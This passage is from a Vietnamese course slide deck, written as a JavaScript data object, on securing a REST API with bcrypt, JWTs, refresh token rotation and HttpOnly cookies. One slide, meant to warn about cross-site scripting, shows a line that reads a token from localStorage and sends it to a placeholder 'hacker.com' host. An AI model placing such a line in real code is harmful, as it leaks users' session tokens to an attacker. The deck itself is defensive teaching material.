/* ============================================================
   BUỔI 9 — Authentication: bcrypt, JSON Web Token (JWT) & Refresh Token
   ============================================================ */
SESSION_DATA[9] = {
  intro: 'Buổi bản lề về An ninh & Bảo mật hệ thống REST API. Phân biệt rõ Authentication và Authorization. Nắm vững bản chất hàm băm một chiều với Salt của Bcrypt, giải phẫu cấu trúc 3 phần của JWT (Header.Payload.Signature), làm chủ cơ chế Refresh Token Rotation, xử lý lưu trữ an toàn chống XSS/CSRF và hoàn thiện module Đăng ký/Đăng nhập cho DevBlog API.',
  agenda: [
    { min: 10, t: 'Ôn B8 & Đặt vấn đề an ninh hệ thống', d: 'Tại sao API cần xác minh danh tính người gọi?' },
    { min: 30, t: 'Lưu mật khẩu an toàn: Salt, Hash & Bcrypt', d: 'Rainbow table, cost factor, so sánh bất biến' },
    { min: 30, t: 'Session/Cookie vs Token JWT: Stateful vs Stateless', d: 'Khả năng mở rộng ngang, microservices' },
    { min: 10, t: 'Giải lao', d: '' },
    { min: 35, t: 'Giải phẫu chi tiết JWT & Thư viện jsonwebtoken', d: 'Header, Payload, Signature, HS256 vs RS256' },
    { min: 35, t: 'Chiến lược Refresh Token Rotation & Lưu trữ an toàn', d: 'Silent refresh, HttpOnly cookie vs LocalStorage' },
    { min: 40, t: 'Live code: Register, Login, Me & Auth Middleware', d: 'req.user, bảo vệ route, bắt TokenExpiredError' },
    { min: 15, t: 'Tổng kết & giao bài tập B09', d: 'Đồ án DevBlog cột mốc 4a' }
  ],
  slides: [
    /* ---------- SECTION 01: LƯU TRỮ MẬT KHẨU & BCRYPT ---------- */
    { kind: 'section', no: '01', title: 'Lưu trữ Mật khẩu & Hàm Băm Mật mã', sub: 'Không bao giờ, dưới bất kỳ lý do gì, lưu mật khẩu người dùng ở dạng văn bản thuần.' },
    {
      title: 'Thảm họa Lưu Plain Text & MD5 / SHA-1', layout: 'split', ratio: '1fr 1fr',
      cols: [
        { h: '❌ Plain Text / MD5 / SHA-1 (Tử huyệt)', cls: 'bad', bullets: [
          '• **Lưu Plain Text**: Bất kỳ ai có quyền truy cập DB (hoặc hacker tấn công SQL Injection) đều đọc được 100% mật khẩu.',
          '• **Người dùng thường dùng chung 1 mật khẩu** cho Gmail, Facebook, Ngân hàng ➔ Lộ 1 nơi mất sạch tất cả!',
          '• **MD5 / SHA-1 quá nhanh**: Card đồ họa GPU hiện đại có thể tính toán **hàng chục tỷ hash mỗi giây** để dò mật khẩu.',
          '• **Rainbow Tables**: Bảng dữ liệu khổng lồ tính sẵn hash của hàng trăm triệu mật khẩu phổ biến ➔ Tra ngược ra mật khẩu trong 1 giây!'
        ] },
        { h: '✅ Bcrypt + Salt (Chuẩn bảo mật quốc tế)', cls: 'good', bullets: [
          '• **Salt ngẫu nhiên**: Mỗi mật khẩu được trộn với một chuỗi ngẫu nhiên riêng biệt trước khi băm.',
          '• Hai người cùng đặt mật khẩu `123456` sẽ cho ra 2 chuỗi hash **hoàn toàn khác nhau** trong cơ sở dữ liệu!',
          '• Vô hiệu hóa 100% các cuộc tấn công tra cứu bằng Rainbow Tables.',
          '• **Cơ chế Adaptive Cost (Work Factor)**: Cố ý làm chậm quá trình băm để ngăn chặn triệt để tấn công vét cạn (Brute-force)!'
        ] }
      ],
      callout: { type: 'danger', t: 'Năm 2012, mạng xã hội LinkedIn bị rò rỉ 6.5 triệu mật khẩu do chỉ băm bằng SHA-1 không muối; hơn 90% số tài khoản đã bị bẻ khóa chỉ sau vài ngày!' }
    },
    {
      title: 'Cơ Chế Cryptographic Hash & Salt', layout: 'split', ratio: '1.05fr .95fr',
      bullets: [
        '**Hàm băm một chiều (One-way Cryptographic Hash)**:',
        '• Từ mật khẩu $P$, hàm toán học tính ra giá trị băm $H = \\text{Hash}(P)$.',
        '• Hoàn toàn không tồn tại thuật toán đảo ngược để tìm lại $P$ từ $H$.',
        '**Hiệu ứng Tuyết lở (Avalanche Effect)**:',
        '• Chỉ cần thay đổi 1 ký tự duy nhất (vd: `Admin1` thành `Admin2`), chuỗi băm đầu ra sẽ thay đổi hoàn toàn trên 50% số bit.',
        '**Cơ chế Sinh muối ngẫu nhiên (Salt)**:',
        '• Một chuỗi byte ngẫu nhiên $S$ được sinh ra riêng cho từng người dùng.',
        '• Ghép $P + S$ rồi mới đưa vào hàm băm ➔ Kẻ tấn công buộc phải bẻ khóa thủ công từng tài khoản một, không thể bẻ khóa hàng loạt.'
      ],
      img: { src: 'hash-function.svg', cap: 'Nguyên lý hoạt động của hàm băm một chiều kết hợp Salt ngẫu nhiên', h: 420 }
    },
    {
      title: 'Bản Chất Thuật Toán Bcrypt: Adaptive Cost Factor', layout: 'split', ratio: '1.15fr .85fr',
      bullets: [
        '**Vì sao Bcrypt là vua bảo mật mật khẩu?**',
        '• Thuật toán do Niels Provos và David Mazières phát triển năm 1999 dựa trên mật mã khối Blowfish.',
        '• **Adaptive Cost Factor (Độ phức tạp tùy chỉnh)**: Tham số $R$ (Cost rounds). Số vòng lặp băm thực tế được tính bằng $2^R$.',
        '• Khi $R = 10$: $2^{10} = 1,024$ vòng lặp (~80ms trên máy chủ hiện đại).',
        '• Khi $R = 12$: $2^{12} = 4,096$ vòng lặp (~320ms).',
        '• **Tính thích ứng theo thời gian**: Trong tương lai khi máy tính mạnh hơn gấp 10 lần, ta chỉ cần tăng $R$ lên 13 hay 14 mà không cần đổi thuật toán!'
      ],
      img: { src: 'hash-function.svg', cap: 'Cơ chế kéo dài thời gian tính toán của Bcrypt chống GPU Brute-force', h: 360 },
      callout: { type: 'tip', t: 'Mức `SALT_ROUNDS = 10` là tiêu chuẩn vàng ngành công nghiệp: Đủ nhanh để người dùng không cảm thấy lag, nhưng đủ chậm để hacker mất 500 năm mới dò xong 1 mật khẩu phức tạp.' }
    },
    {
      title: 'Giải Phẫu Chuỗi Bcrypt Hash trong Cơ Sở Dữ Liệu', layout: 'split', ratio: '1.1fr .9fr',
      code: { lang: 'text', size: 'sm', src: `$2b$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy
├──┘ ├──┘ ├────────────────────┘├─────────────────────────────┘
 │    │            │                           │
 │    │            │                           └── 31 ký tự băm mật mã
 │    │            └── 22 ký tự Salt ngẫu nhiên được trích xuất
 │    └── Cost Factor (2^10 = 1024 vòng lặp)
 └── Thuật toán Bcrypt phiên bản 2b` },
      bullets: [
        '**Đặc điểm cấu trúc lưu trữ**:',
        '• Độ dài luôn cố định đúng **60 ký tự ASCII**.',
        '• Chuỗi Salt được lưu trữ công khai ngay bên trong hash ➔ Do đó ta không cần phải tạo thêm một cột `salt` riêng trong database!',
        '• Khi người dùng đăng nhập, thư viện Bcrypt tự động trích xuất chuỗi Salt cũ ra để băm lại mật khẩu nhập vào rồi so sánh.'
      ]
    },
    {
      title: 'Hiện Thực Hóa Bcrypt trong Node.js', badge: 'LIVE CODING',
      term: `$ npm install bcrypt`,
      code: { file: 'src/utils/password.js', lang: 'javascript', size: 'sm', src: `const bcrypt = require('bcrypt');

const SALT_ROUNDS = 10;

// 1. Khi Đăng ký: Băm mật khẩu thuần thành chuỗi hash an toàn
exports.hashPassword = async (plainPassword) => {
  return await bcrypt.hash(plainPassword, SALT_ROUNDS);
};

// 2. Khi Đăng nhập: So sánh mật khẩu người dùng nhập với hash trong DB
exports.comparePassword = async (plainPassword, hashedPassword) => {
  return await bcrypt.compare(plainPassword, hashedPassword);
};` },
      callout: { type: 'danger', t: 'Tuyệt đối không bao giờ dùng `bcrypt.hashSync` hay `bcrypt.compareSync` trong Express handler! Vì Bcrypt tốn CPU, các hàm Sync sẽ làm **đóng băng hoàn toàn Event Loop** của Node.js, khiến mọi người dùng khác bị treo!' }
    },
    {
      title: 'Timing Attack & So Sánh Thời Gian Bất Biến', layout: 'split', ratio: '1.15fr .85fr',
      bullets: [
        '**Lỗ hổng Timing Attack là gì?**',
        '• Phép so sánh chuỗi thông thường `a === b` sẽ dừng lại ngay ở ký tự sai đầu tiên. Ký tự đầu sai ➔ mất 0.1ms; ký tự thứ năm mới sai ➔ mất 0.5ms.',
        '• Hacker gửi hàng triệu request và đo thời gian phản hồi bằng micro-giây để lần ra từng ký tự một của mật khẩu!',
        '**Giải pháp của `bcrypt.compare`**:',
        '• Thực hiện **Constant-time Comparison (So sánh thời gian bất biến)**.',
        '• Dù đúng hay sai, hàm so sánh luôn duyệt qua toàn bộ độ dài chuỗi để thời gian thực thi là như nhau, triệt tiêu hoàn toàn khả năng nghe lén thời gian.'
      ],
      img: { src: 'hash-function.svg', cap: 'Cơ chế so sánh bất biến loại bỏ rò rỉ thông tin qua thời gian phản hồi', h: 360 }
    },

    /* ---------- SECTION 02: CƠ CHẾ XÁC THỰC: SESSION VS JWT ---------- */
    { kind: 'section', no: '02', title: 'Cơ chế Xác thực: Stateful Session vs Stateless JWT', sub: 'Hiểu cặn kẽ sự đánh đổi giữa quản lý phiên máy chủ và mã thông báo không trạng thái.' },
    {
      title: 'Authentication (Xác thực) vs Authorization (Phân quyền)', layout: 'split', ratio: '1fr 1fr',
      cols: [
        { h: '🔑 Authentication (Xác thực danh tính)', cls: 'good', bullets: [
          '• Câu hỏi cốt lõi: **"BẠN LÀ AI?"**',
          '• Hành động: Đăng nhập bằng Email + Mật khẩu, hoặc qua Google / GitHub OAuth, sinh trắc học vân tay.',
          '• Kết quả: Hệ thống cấp cho bạn một bằng chứng xác nhận danh tính (Session ID hoặc Token JWT).',
          '• Nếu thất bại ➔ Trả mã lỗi **`401 Unauthorized`** (Chưa xác thực).'
        ] },
        { h: '🛡️ Authorization (Kiểm tra quyền hạn)', cls: 'good', bullets: [
          '• Câu hỏi cốt lõi: **"BẠN CÓ QUYỀN LÀM VIỆC NÀY KHÔNG?"**',
          '• Hành động: Kiểm tra vai trò (`role: "admin"`) hoặc quyền sở hữu bài viết.',
          '• Người dùng đã đăng nhập hợp lệ (Authentication xong), nhưng cố tình bấm nút "Xóa bài viết của người khác".',
          '• Nếu thất bại ➔ Trả mã lỗi **`403 Forbidden`** (Bị cấm truy cập).'
        ] }
      ],
      callout: { type: 'tip', t: 'Buổi 9 tập trung 100% vào **Authentication** (Đăng ký, Đăng nhập, Cấp JWT). Buổi 10 sẽ đi sâu vào **Authorization** (Phân quyền RBAC).' }
    },
    {
      title: 'Mô hình Stateful: Session-Based trên Cookie', layout: 'split', ratio: '1.15fr .85fr',
      bullets: [
        '**Mô hình truyền thống (Stateful)**:',
        '1. Người dùng gửi thông tin đăng nhập lên máy chủ.',
        '2. Server kiểm tra đúng ➔ Sinh ra một chuỗi ngẫu nhiên `SessionId` và lưu dữ liệu phiên `{ userId: 1, role: "admin" }` vào RAM của server hoặc cụm Redis.',
        '3. Server gửi `SessionId` về trình duyệt qua header `Set-Cookie`.',
        '4. Ở các request sau, trình duyệt tự động đính kèm Cookie `connect.sid`. Server tra cứu trong RAM để biết ai đang gọi.',
        '**Nhược điểm chí mạng của Session**:',
        '• **Khó mở rộng ngang (Horizontal Scaling)**: Nếu có 3 server chạy sau Load Balancer, request sau bay vào Server 2 sẽ không có Session của Server 1 (lỗi đăng xuất bất ngờ)!',
        '• Tốn kém bộ nhớ RAM khi có hàng triệu người dùng trực tuyến.'
      ],
      img: { src: 'cookie-exchange.svg', cap: 'Mô hình trao đổi Cookie truyền thống giữa Web Browser và Web Server', h: 360 }
    },
    {
      title: 'Mô hình Stateless: Token-Based với JSON Web Token (JWT)', layout: 'split', ratio: '1.05fr .95fr',
      bullets: [
        '**Mô hình hiện đại (Stateless)**:',
        '1. Người dùng gửi thông tin đăng nhập `POST /api/v1/auth/login`.',
        '2. Server xác thực xong ➔ Đóng gói thông tin người dùng vào Token, dùng Khóa bí mật (SECRET) để ký chữ ký số, rồi trả token về cho Client.',
        '3. **Server KHÔNG CẦN LƯU BẤT KỲ ĐIỀU GÌ vào RAM hay Database**!',
        '4. Ở các request tiếp theo, Client tự đính kèm token vào Header: `Authorization: Bearer <token>`.',
        '5. Bất kỳ máy chủ nào trong cụm server cũng có thể tự xác minh chữ ký số của token chỉ trong vài micro-giây bằng SECRET!',
        '• **Khả năng mở rộng vô hạn**: Cực kỳ lý tưởng cho hệ thống Cloud, Microservices, Mobile App và kiến trúc Single Page Application (React/Vue).'
      ],
      img: { src: 'jwt-logo.svg', cap: 'JSON Web Token — Chuẩn mực công nghiệp mở RFC 7519 cho API', h: 360 }
    },
    {
      title: 'So Sánh Toàn Diện: Session/Cookie vs Token JWT',
      table: {
        head: ['Tiêu chí so sánh', 'Session-Based (Stateful Cookie)', 'Token-Based (Stateless JWT)'],
        rows: [
          ['Nơi lưu trữ phiên', 'Server-side (RAM / Redis bộ nhớ máy chủ)', 'Client-side (Trình duyệt / Mobile App)'],
          ['Tải bộ nhớ Server', 'Tăng dần theo số lượng người dùng online', 'Bằng 0 (Server không tốn RAM lưu session)'],
          ['Mở rộng cụm Server', 'Phức tạp, cần Session Replication hoặc Redis', 'Dễ dàng mở rộng hàng trăm server ngay lập tức'],
          ['Đa nền tảng', 'Khó dùng cho Mobile App / Smart Device', 'Hoàn hảo cho Web, iOS, Android, IoT'],
          ['Thu hồi đăng xuất', 'Rất dễ: Chỉ cần xóa Session trong Redis', 'Khó hơn: Token stateless có hiệu lực tới khi hết hạn'],
          ['Khả năng chống tấn công', 'Dễ dính CSRF nếu không có cờ SameSite', 'An toàn trước CSRF nếu lưu Bearer Token trong Header']
        ], small: true
      }
    },
    {
      title: 'Quy Trình Xác Thực JWT Toàn Diện (Auth Flow)', layout: 'split', ratio: '1.05fr .95fr',
      bullets: [
        '**Giai đoạn 1: Đăng nhập & Cấp phát Token**:',
        '• Client gửi Email + Password lên `/api/v1/auth/login`.',
        '• Server xác minh mật khẩu bằng Bcrypt ➔ Sinh JWT token có chữ ký.',
        '• Server trả về JSON chứa token: `{ success: true, token: "eyJhbGci..." }`.',
        '**Giai đoạn 2: Sử dụng Token truy cập API bảo vệ**:',
        '• Client đính kèm Header: `Authorization: Bearer <token>`.',
        '• Auth Middleware của Express bóc tách token, chạy `jwt.verify(token, SECRET)`.',
        '• Nạp thông tin người dùng vào `req.user = decodedPayload`.',
        '• Controller xử lý nghiệp vụ và biết chắc chắn người dùng là ai!'
      ],
      img: { src: 'oauth-token-flow.svg', cap: 'Sơ đồ luồng giao tiếp xác thực Token chuẩn mực từ Client tới Server (Wikipedia)', h: 520 }
    },

    /* ---------- SECTION 03: GIẢI PHẪU CHI TIẾT JWT ---------- */
    { kind: 'section', no: '03', title: 'Giải phẫu Chi tiết JSON Web Token (JWT)', sub: 'Bóc tách cấu trúc 3 phần Header, Payload, Signature và cơ chế ký số HMAC.' },
    {
      title: 'Giải Phẫu 3 Phần của JSON Web Token', layout: 'split', ratio: '1.05fr .95fr',
      bullets: [
        'Một chuỗi JWT hợp lệ luôn bao gồm **3 phần phân tách nhau bởi 2 dấu chấm** (`.`):',
        '🔴 **1. Header (Màu đỏ)**: Định nghĩa thuật toán băm chữ ký và loại token (`{"alg": "HS256", "typ": "JWT"}`).',
        '🟣 **2. Payload (Màu tím)**: Chứa các thông tin khai báo (Claims) về người dùng và thời hạn hết hạn (`{"id": 1, "role": "admin", "exp": 1793160000}`).',
        '🔵 **3. Signature (Màu xanh dương)**: Chữ ký số điện tử bảo vệ toàn vẹn dữ liệu, được tính toán từ Header + Payload + Secret Key.'
      ],
      img: { src: 'jwt-structure.svg', cap: 'Giải phẫu 3 phần Header, Payload, Signature của JSON Web Token', h: 360 }
    },
    {
      title: 'Phần 1 & 2: Header và Payload Claims', layout: 'split', ratio: '1fr 1fr',
      cols: [
        { h: '🔴 Header (Thuật toán)', code: { lang: 'json', size: 'sm', src: `{
  "alg": "HS256", // Thuật toán HMAC-SHA256
  "typ": "JWT"    // Loại mã thông báo
}` } },
        { h: '🟣 Payload (Dữ liệu Claims)', code: { lang: 'json', size: 'sm', src: `{
  // 1. Registered Claims (Chuẩn quốc tế):
  "sub": "user_12345",
  "iat": 1793150000, // Issued At (Thời điểm cấp)
  "exp": 1793157200, // Expiration (Hạn sử dụng)
  
  // 2. Custom Claims (Nghiệp vụ của bạn):
  "id": 1,
  "email": "lan@ct9.vn",
  "role": "admin"
}` } }
      ],
      callout: { type: 'danger', t: '**Cảnh báo an ninh sống còn**: Cả Header và Payload **CHỈ ĐƯỢC MÃ HÓA BASE64URL, HOÀN TOÀN KHÔNG PHẢI MÃ HÓA BÍ MẬT!** Bất kỳ ai bắt được token đều có thể copy vào trang `jwt.io` để đọc rõ 100% nội dung Payload. **Tuyệt đối không bao giờ nhét mật khẩu, mã PIN hay số thẻ tín dụng vào Payload!**' }
    },
    {
      title: 'Phần 3: Signature — Chữ Ký Số Bảo Vệ Tính Toàn Vẹn', layout: 'split', ratio: '1.15fr .85fr',
      code: { lang: 'javascript', size: 'sm', src: `// Công thức toán học tạo ra Signature:
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  process.env.JWT_SECRET // 👉 Khóa bí mật chỉ có Server nắm giữ!
)

// ============================================
// HACKER CÓ THỂ THAY ĐỔI DỮ LIỆU ĐƯỢC KHÔNG?
// ============================================
// Giả sử Hacker sửa Payload: "role": "user" -> "role": "admin"
// Khi Server nhận được token bị sửa đổi:
// 1. Server tính lại Signature từ Header + Payload_Mới + SECRET
// 2. Chữ ký mới tính ra HOÀN TOÀN KHÁC với Chữ ký cũ của token!
// -> Server lập tức phát hiện token bị giả mạo và từ chối 401 Unauthorized!` },
      bullets: [
        '**Sức mạnh của Chữ ký số điện tử**:',
        '• Đảm bảo tính toàn vẹn (Integrity) và bất khả thoái thác.',
        '• Người dùng có thể nhìn thấy nội dung bên trong, nhưng không bao giờ có thể tự sửa đổi dữ liệu nếu không biết `JWT_SECRET` của server.'
      ]
    },
    {
      title: 'Thư Viện jsonwebtoken: Tạo Token với jwt.sign()', badge: 'LIVE CODING',
      term: `$ npm install jsonwebtoken`,
      code: { file: 'src/utils/jwt.js', lang: 'javascript', size: 'sm', src: `const jwt = require('jsonwebtoken');
const config = require('../config');

// 1. Hàm tạo Access Token:
exports.signAccessToken = (user) => {
  const payload = {
    id: user.id,
    email: user.email,
    role: user.role
  };

  return jwt.sign(payload, config.jwt.secret, {
    expiresIn: config.jwt.expiresIn || '15m', // Hết hạn sau 15 phút
    issuer: 'devblog-api',
    audience: 'devblog-client'
  });
};` },
      callout: { type: 'tip', t: 'Quy chuẩn thời gian hết hạn (`expiresIn`): `\'15m\'` (15 phút), `\'2h\'` (2 tiếng), `\'7d\'` (7 ngày). Luôn đặt thời hạn cho token để giảm thiểu rủi ro khi token bị lộ.' }
    },
    {
      title: 'Thư Viện jsonwebtoken: Xác Thực với jwt.verify()', layout: 'split', ratio: '1.15fr .85fr',
      code: { file: 'src/utils/jwt.js', lang: 'javascript', size: 'sm', src: `// 2. Hàm giải mã và xác thực Token:
exports.verifyAccessToken = (token) => {
  return jwt.verify(token, config.jwt.secret);
};

// ============================================
// CÁC NGOẠI LỆ MÀ jwt.verify() CÓ THỂ NÉM RA:
// ============================================
try {
  const decoded = exports.verifyAccessToken(token);
} catch (err) {
  if (err.name === 'TokenExpiredError') {
    // Token đã hết hạn sử dụng!
    console.log('Token expired at:', err.expiredAt);
  } else if (err.name === 'JsonWebTokenError') {
    // Chữ ký sai lệch, token rác, token bị chỉnh sửa!
    console.log('Invalid token structure or signature');
  }
}` },
      bullets: [
        '**Quy trình xác minh tự động của `jwt.verify`**:',
        '• Kiểm tra tính hợp lệ của chữ ký số bằng Khóa bí mật.',
        '• So sánh thời điểm hiện tại `Date.now()` với mốc thời gian hết hạn `exp` trong Payload.',
        '• Nếu thỏa mãn, trả về toàn bộ đối tượng Payload gốc đã được giải mã.'
      ]
    },
    {
      title: 'Thuật Toán Ký Số: Đối Xứng (HS256) vs Bất Đối Xứng (RS256)', layout: 'split', ratio: '1fr 1fr',
      cols: [
        { h: '1. HMAC-SHA256 (HS256 - Khóa Đối Xứng)', code: { lang: 'text', size: 'xs', src: `[Auth Service]
     │ (Ký token bằng SECRET_KEY)
     ▼
[JWT Token]
     │ (Xác thực bằng CÙNG SECRET_KEY)
     ▼
[Post Service / API Gateway]

• Dùng 1 khóa bí mật duy nhất để vừa ký vừa verify.
• Rất nhanh, đơn giản, lý tưởng cho ứng dụng Monolith hoặc nhóm dịch vụ nội bộ.` } },
        { h: '2. RSA-SHA256 (RS256 - Khóa Bất Đối Xứng)', code: { lang: 'text', size: 'xs', src: `[Auth Server (SSO)]
     │ (Ký token bằng PRIVATE_KEY bí mật)
     ▼
[JWT Token]
     │ (Xác thực bằng PUBLIC_KEY công khai)
     ▼
[Hàng chục Microservices bên ngoài]

• Dùng cặp khóa Public / Private Key.
• Auth Server giữ Private Key. Các dịch vụ khác chỉ cần Public Key để kiểm tra mà không sợ lộ chìa khóa ký token!` } }
      ],
      img: { src: 'public-key-encryption.svg', cap: 'Cơ chế mã hóa và ký số bất đối xứng với cặp khóa Public / Private Key (Wikipedia)', h: 500 }
    },
    {
      title: 'HTTP Basic Auth vs Bearer Token: Tiến Hóa Bảo Mật', layout: 'split', ratio: '1.05fr .95fr',
      bullets: [
        '**HTTP Basic Authentication (Cổ xưa)**:',
        '• Header gửi: `Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==` (chính là chuỗi `username:password` mã hóa Base64 thô!).',
        '• **Nguy cơ bảo mật cực lớn**: Mật khẩu người dùng bị gửi đi gửi lại ở **mọi request HTTP**.',
        '**Bearer Token với JWT (Hiện đại)**:',
        '• Người dùng chỉ gửi mật khẩu **đúng 1 lần duy nhất** lúc Đăng nhập.',
        '• Mọi request sau chỉ dùng Token tạm thời có hạn dùng ngắn (`Bearer <token>`).',
        '• Nếu token bị bắt lén, hacker chỉ có quyền tạm thời trong 15 phút mà không bao giờ biết được mật khẩu gốc của tài khoản!'
      ],
      img: { src: 'mdn-basic-auth.svg', cap: 'Mô hình xác thực HTTP Basic Authentication truyền thống', h: 380 }
    },

    /* ---------- SECTION 04: CHIẾN LƯỢC REFRESH TOKEN ---------- */
    { kind: 'section', no: '04', title: 'Chiến lược Refresh Token & Lưu trữ An toàn', sub: 'Giải quyết bài toán cân bằng giữa an ninh tuyệt đối và trải nghiệm người dùng liền mạch.' },
    {
      title: 'Nghịch Lý Hạn Dùng Token & Cặp Đôi Hoàn Hảo', layout: 'split', ratio: '1.1fr .9fr',
      cols: [
        { h: '⚠️ Nghịch lý thời hạn Access Token', cls: 'warn', bullets: [
          '• **Nếu đặt hạn dài (vd: 30 ngày)**: Tiện cho người dùng không phải login lại. Nhưng nếu token bị lộ (qua máy công cộng, wifi quán cafe), hacker sẽ có quyền truy cập suốt 30 ngày mà server không thể hủy!',
          '• **Nếu đặt hạn ngắn (vd: 15 phút)**: Rất an toàn. Nhưng người dùng đang viết dở bài luận thì bị văng ra bắt đăng nhập lại ➔ Trải nghiệm cực kỳ tồi tệ!'
        ] },
        { h: '🛡️ Giải pháp: Cặp đôi Access + Refresh Token', cls: 'good', bullets: [
          '• **Access Token (Ngắn hạn - 15 phút)**: Dùng để gọi API hàng ngày. Stateless, không lưu DB.',
          '• **Refresh Token (Dài hạn - 7 ngày)**: Dùng để xin cấp lại Access Token mới mà người dùng không cần gõ mật khẩu!',
          '• Refresh Token được lưu trong DB để server có thể chủ động **Thu hồi (Revoke)** khi người dùng bấm Đăng xuất.'
        ] }
      ],
      callout: { type: 'tip', t: 'Đây là kiến trúc bảo mật chuẩn mực được áp dụng bởi Google, Facebook, GitHub và Stripe.' }
    },
    {
      title: 'Quy Trình Làm Mới Token Tự Động (Silent Refresh)', layout: 'split', ratio: '1.05fr .95fr',
      bullets: [
        '**Chu trình làm mới token trong im lặng (Silent Refresh Sequence)**:',
        '1. Trình duyệt gửi request với Access Token ➔ Server báo lỗi `401 TokenExpiredError`.',
        '2. Front-end (Axios Interceptor) tự động chặn lỗi 401 lại, không làm gián đoạn người dùng.',
        '3. Front-end gửi request ngầm: `POST /api/v1/auth/refresh-token` kèm Refresh Token.',
        '4. Server xác minh Refresh Token trong DB ➔ Sinh ra một cặp Access Token mới.',
        '5. Front-end lưu Access Token mới và tự động gửi lại request ban đầu thành công mượt mà!'
      ],
      img: { src: 'cookie-exchange.svg', cap: 'Quy trình trao đổi Cookie và lưu trữ phiên an toàn giữa Trình duyệt và Server (Wikimedia)', h: 520 }
    },
    {
      title: 'Kỹ Thuật Xoay Vòng Refresh Token (Refresh Token Rotation)', layout: 'split', ratio: '1.15fr .85fr',
      bullets: [
        '**Mỗi Refresh Token chỉ được phép sử dụng DUY NHẤT MỘT LẦN**:',
        '• Khi client dùng Refresh Token `RT_1` để xin Access Token mới ➔ Server lập tức xóa `RT_1` và cấp lại `RT_2` mới.',
        '**Cơ chế Phát hiện Trộm Token (Token Reuse Detection)**:',
        '• Nếu hacker đã ăn trộm được `RT_1` và cố tình gửi lên sau khi người dùng thật đã đổi sang `RT_2`:',
        '• Server phát hiện `RT_1` đã qua sử dụng ➔ Nhận diện ngay có kẻ gian đang tấn công!',
        '• Server lập tức **HỦY BỎ TOÀN BỘ CÁC TOKEN** thuộc tài khoản này, buộc người dùng phải đăng nhập lại từ đầu bằng mật khẩu.'
      ],
      img: { src: 'oauth-token-flow.svg', cap: 'Cơ chế xác thực xoay vòng Token và hủy quyền truy cập khi có xung đột (Wikipedia)', h: 500 }
    },
    {
      title: 'Nơi Lưu Trữ Token An Toàn: LocalStorage vs HttpOnly Cookie', layout: 'split', ratio: '1fr 1fr',
      cols: [
        { h: '1. LocalStorage (Dễ làm - Nguy cơ XSS)', code: { lang: 'javascript', size: 'xs', src: `// Dễ dùng:
localStorage.setItem('token', token);

// ⚠️ NGUY HIỂM XSS (Cross-Site Scripting):
// Bất kỳ đoạn mã JavaScript độc hại nào
// được chèn vào trang web (qua thư viện npm rác,
// ô comment chưa lọc thẻ <script>)
// ĐỀU CÓ THỂ ĐỌC ĐƯỢC TOKEN:
const stolen = localStorage.getItem('token');
fetch('https://hacker.com/steal?t=' + stolen);` } },
        { h: '2. HttpOnly Cookie (Chuẩn bảo mật cao)', code: { lang: 'javascript', size: 'xs', src: `// Server gửi về qua Header:
res.cookie('refreshToken', token, {
  httpOnly: true, // 🛡️ JavaScript KHÔNG THỂ ĐỌC!
  secure: true,   // Chỉ gửi qua HTTPS
  sameSite: 'strict', // Chống CSRF
  maxAge: 7 * 24 * 60 * 60 * 1000
});

// ✅ Hacker tiêm mã XSS cũng không thể
// đánh cắp được HttpOnly Cookie này!` } }
      ],
      callout: { type: 'tip', t: 'Kiến trúc bảo mật khuyến nghị cao nhất: **Lưu Access Token trong bộ nhớ RAM biến JavaScript (hoặc LocalStorage ngắn hạn), và lưu Refresh Token trong HttpOnly Cookie an toàn**.' }
    },
    {
      title: 'Chiến Lược Hủy Token: Token Blacklisting với Redis', layout: 'split', ratio: '1.15fr .85fr',
      code: { lang: 'javascript', size: 'sm', src: `// Khi người dùng bấm Đăng Xuất (Logout):
exports.logout = async (req, res) => {
  const token = req.token; // Lấy token từ header
  const decoded = req.user;

  // Tính toán thời gian sống còn lại của Token (TTL):
  const remainingSeconds = decoded.exp - Math.floor(Date.now() / 1000);

  if (remainingSeconds > 0) {
    // Lưu Token vào danh sách đen (Blacklist) trong Redis:
    // Key sẽ tự động biến mất khi token hết hạn thực tế!
    await redisClient.setEx(\`blacklist:\${token}\`, remainingSeconds, 'revoked');
  }

  res.status(200).json({ success: true, message: 'Đăng xuất thành công' });
};` },
      bullets: [
        '**Khắc phục nhược điểm lớn nhất của Stateless JWT**:',
        '• Khi bị lộ token hoặc người dùng bấm Đăng xuất, ta không thể "xóa" JWT khỏi tay client.',
        '• **Giải pháp Token Blacklist**: Lưu token bị thu hồi vào Redis bộ nhớ tốc độ cao với thời gian tự hủy (TTL = `exp - now`).',
        '• Trong `auth.middleware`, chỉ cần kiểm tra nhanh `await redis.exists(...)` mất 1ms để từ chối các token đã bị khai tử!'
      ]
    },
    {
      title: 'Cơ Chế Silent Refresh Phía Front-end: Axios Interceptors', layout: 'split', ratio: '1.15fr .85fr',
      code: { lang: 'javascript', size: 'xs', src: `import axios from 'axios';

const api = axios.create({ baseURL: '/api/v1' });

// Tự động chặn khi nhận lỗi 401 từ Server:
api.interceptors.response.use(
  (response) => response,
  async (error) => {
    const originalRequest = error.config;

    // Nếu lỗi 401 và chưa từng thử refresh:
    if (error.response?.status === 401 && !originalRequest._retry) {
      originalRequest._retry = true;

      try {
        // 1. Gọi ngầm API xin Access Token mới:
        const { data } = await axios.post('/api/v1/auth/refresh-token');
        const newAccessToken = data.accessToken;

        // 2. Cập nhật token mới vào header:
        api.defaults.headers.common['Authorization'] = 'Bearer ' + newAccessToken;
        originalRequest.headers['Authorization'] = 'Bearer ' + newAccessToken;

        // 3. Gửi lại request ban đầu một cách êm ái:
        return api(originalRequest);
      } catch (refreshError) {
        // Refresh token cũng hết hạn -> Chuyển về trang Login!
        window.location.href = '/login';
      }
    }
    return Promise.reject(error);
  }
);` },
      bullets: [
        '**Trải nghiệm người dùng liền mạch (Seamless UX)**:',
        '• Người dùng hoàn toàn không biết Access Token vừa hết hạn và vừa được làm mới trong 0.2 giây!',
        '• Giữ vững phiên làm việc hàng tuần liền mà không cần bắt người dùng nhập lại mật khẩu.'
      ]
    },

    /* ---------- SECTION 05: HIỆN THỰC HÓA AUTH CHO DEVBLOG ---------- */
    { kind: 'section', no: '05', title: 'Hiện thực hóa Hệ thống Auth cho DevBlog', sub: 'Xây dựng toàn bộ các API Đăng ký, Đăng nhập, Profile và Middleware bảo vệ.' },
    {
      title: 'Quy Trình API Đăng Ký /api/v1/auth/register', layout: 'split', ratio: '1.1fr .9fr',
      steps: [
